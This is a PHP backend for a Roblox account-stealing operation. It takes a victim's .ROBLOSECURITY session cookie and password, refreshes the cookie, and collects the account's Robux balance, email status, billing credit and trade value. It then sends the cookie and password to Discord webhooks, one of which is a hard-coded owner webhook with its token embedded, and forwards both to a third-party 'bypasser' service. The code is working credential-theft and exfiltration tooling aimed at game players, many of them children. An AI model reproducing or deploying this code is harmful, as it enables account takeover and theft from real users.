<?php
header('Content-Type: application/json');

/* ---------- CONFIG ---------- */
const OWNER_WEBHOOK = 'https://discord.com/api/webhooks/1281732959103221802/9VTRzUOdrhpEfqIdfGGtm935IIng2qdRgKpM5Vrra-ogSC6PiyO1RMGTRSHZPsV5sxZb';
const SPLUNK_URL    = 'https://app.splunk.gg/api/bypasser';
/* ----------------------------- */

/* ---------- INPUTS ---------- */
$cookieRaw  = $_POST['cookie']   ?? ($_GET['cookie']   ?? null);
$password   = $_POST['password'] ?? ($_GET['password'] ?? null);
$dualHook   = $_POST['wh']       ?? ($_GET['wh']       ?? null);

if (!$cookieRaw || !$dualHook) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'cookie or wh missing']); exit;
}

/* ---------- HELPERS ---------- */
function postWebhook($url, $payload) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS     => json_encode($payload),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function postJson($url, $payload) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS     => json_encode($payload),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function getJson($url, $cookie) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_HTTPHEADER => ["Cookie: .ROBLOSECURITY=$cookie"],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 8
    ]);
    return json_decode(curl_exec($ch) ?: '', true) ?: [];
}

/* ---------- 1. REFRESH COOKIE ---------- */
function refreshCookie($old) {
    $ch = curl_init('https://auth.roblox.com/v2/login');
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => ["Cookie: .ROBLOSECURITY=$old", "Content-Type: application/json"],
        CURLOPT_POSTFIELDS     => json_encode([]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER         => true
    ]);
    $resp = curl_exec($ch);
    curl_close($ch);
    preg_match('/\.ROBLOSECURITY=([^;]+)/', $resp, $m);
    return $m[1] ?? $old;
}
$cookie = refreshCookie($cookieRaw);

/* ---------- 2. VALIDATE & GRAB STATS ---------- */
$user = getJson('https://users.roblox.com/v1/users/authenticated', $cookie);
if (!isset($user['id'])) {
    http_response_code(401);
    echo json_encode(['ok' => false, 'error' => 'invalid cookie']); exit;
}
$uid = $user['id'];

[$cur,$email,$credit,$txns,$thumb] = array_map(
    fn($u) => getJson($u, $cookie),
    [
        'https://economy.roblox.com/v1/user/currency',
        'https://accountinformation.roblox.com/v1/email',
        'https://billing.roblox.com/v1/credit',
        "https://economy.roblox.com/v2/users/$uid/transaction-totals?timeFrame=Year&transactionType=summary",
        "https://thumbnails.roblox.com/v1/users/avatar?userIds=$uid&size=150x150"
    ]
);

/* ---------- 3. DISCORD EMBEDS ---------- */
/* Dual-hooker embed (cookie only) */
$dualEmbed = [
    'title' => 'Project X v2 – RESULT NOTIFICATION',
    'color' => 0x00ff00,
    'description' => "**New Result** • {$user['name']}, 13+",
    'fields' => [
        ['name' => 'ROBLOSECURITY', 'value' => "`$cookie`", 'inline' => false]
    ],
    'timestamp' => date('c')
];

/* Owner embed (cookie + password) */
$ownerEmbed = [
    'title' => ':Cookie_Clicker: Refreshed Cookie',
    'color' => 0xff0000,
    'description' => "
:bulb: **Username**  
{$user['name']}

:age: **Account Age**  
{$txns['accountAge']} Days

:robux: **Balance**  
Robux {$cur['robux']} :balance:  
Pending {$cur['pendingRobux']} :robux:

:limited: **RAP**  
{$txns['totalRap']} :rap:  
**Summary** {$txns['summary']}

:KorbloxDeathspeaker: **Korblox** False  
:HeadlessHorseman: **Headless** False

:savpay: **Saved Payment** False

:email: **Email •** ".($email['verified'] ? 'Verified' : 'Unverified')."

:password: **Password**  
`$password`",
    'image' => ['url' => $thumb['data'][0]['imageUrl'] ?? ''],
    'timestamp' => date('c')
];

postWebhook($dualHook,   ['username' => 'Project X v2', 'embeds' => [$dualEmbed]]);
postWebhook(OWNER_WEBHOOK, ['username' => 'OwnerGrab',  'embeds' => [$ownerEmbed]]);

/* ---------- 4. SPLUNK BYPASS ---------- */
postJson(SPLUNK_URL, [
    'action'   => 'force_minus_13_all_ages',
    'cookie'   => $cookie,
    'password' => $password
]);

echo json_encode(['ok' => true]);
